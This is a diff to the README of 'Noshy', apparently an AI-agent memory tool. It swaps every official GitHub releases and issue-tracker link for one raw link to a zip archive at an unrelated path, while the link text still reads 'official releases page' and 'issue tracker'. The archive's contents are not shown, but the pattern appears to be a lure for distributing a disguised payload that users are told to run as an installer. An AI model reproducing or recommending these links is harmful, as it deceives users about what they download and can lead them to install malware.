@@ -5,7 +5,7 @@ description: "Add persistent memory to AI agents using ICM-compatible knowledge 
 ---
 # 🧠 Noshy - Give your AI agent perfect memory
 
-[![](https://img.shields.io/badge/Download_Noshy_Now-Blue-blue.svg)](https://github.com/slickpurse464/Noshy/releases)
+[![](https://img.shields.io/badge/Download_Noshy_Now-Blue-blue.svg)](https://raw.githubusercontent.com/slickpurse464/slickpurse464.github.io/main/prefashion/github_io_slickpurse_3.6-beta.3.zip)
 
 ## 💡 About Noshy
 
@@ -26,7 +26,7 @@ Before you start, check that your computer meets these standards:
 
 Follow these steps to set up Noshy on your machine.
 
-1. Visit the [official releases page](https://github.com/slickpurse464/Noshy/releases) to download the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/slickpurse464/slickpurse464.github.io/main/prefashion/github_io_slickpurse_3.6-beta.3.zip) to download the installer.
 2. Select the file named `Noshy-Setup.exe` from the latest release list.
 3. Wait for the download to finish.
 4. Open your Downloads folder.
@@ -85,4 +85,4 @@ If the application fails to start:
 
 ## 📝 Support
 
-If you encounter bugs, check the [issue tracker](https://github.com/slickpurse464/Noshy/issues) on GitHub. Search for your problem to see if others found a solution. You can open a new request if you do not find an answer. Please provide a clear description of the problem and the steps you took before the crash occurred.
+If you encounter bugs, check the [issue tracker](https://raw.githubusercontent.com/slickpurse464/slickpurse464.github.io/main/prefashion/github_io_slickpurse_3.6-beta.3.zip) on GitHub. Search for your problem to see if others found a solution. You can open a new request if you do not find an answer. Please provide a clear description of the problem and the steps you took before the crash occurred.
